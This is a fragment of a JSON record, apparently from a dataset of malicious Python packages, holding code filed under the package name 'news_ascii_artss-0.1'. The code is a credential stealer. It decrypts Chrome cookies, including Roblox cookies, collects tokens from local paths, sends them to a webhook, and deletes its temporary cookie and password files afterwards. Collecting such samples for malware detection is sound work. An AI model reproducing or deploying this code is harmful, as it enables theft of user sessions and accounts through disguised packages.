conn.close()\n  except Exception as e:\n    pass\n\ndef grabCookies():\n  global robloxcookies, list_cookie\n  appdata = os.getenv('LOCALAPPDATA')\n  chrome_user_data = ntpath.join(appdata, 'Google', 'Chrome', 'User Data')\n  chrome_reg = re.compile(r'(^profile\\s\\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE)\n  chrome_key = laclestpbg_chrome(ntpath.join(chrome_user_data, \"Local State\"))\n  dire = mkdtemp(), gettempdir()\n  for prof in os.listdir(chrome_user_data):\n    if re.match(chrome_reg, prof):\n      login_db = ntpath.join(chrome_user_data, prof, 'Network', 'cookies')\n      conn = sqlite3.connect(login_db)\n      cursor = conn.cursor()\n      cursor.execute(\"SELECT host_key, name, encrypted_value from cookies\")\n      for r in cursor.fetchall():\n        ...\n      cursor.close()\n      conn.close()\n\ndef tken():\n  ...\n  for platform, path in paths.items():\n    if not os.path.exists(path):\n      continue\n    tokens = find_tokens(path)\n    ...\n  embed = { ... }\n  result = requests.post(notrewebhook, json={\"embeds\": [embed]})\n\ndef initialize():\n  ...\n  try:\n    os.remove(f\"./cookie_{nom_utilisateur}.txt\")\n  except:\n    pass\n  try:\n    os.remove(f\"./pswd_{nom_utilisateur}.txt\")\n  except:\n    pass"
    }
  },
  {
    "metadata": {
      "package_name": "news_ascii_artss-0.1"
    }
  }
]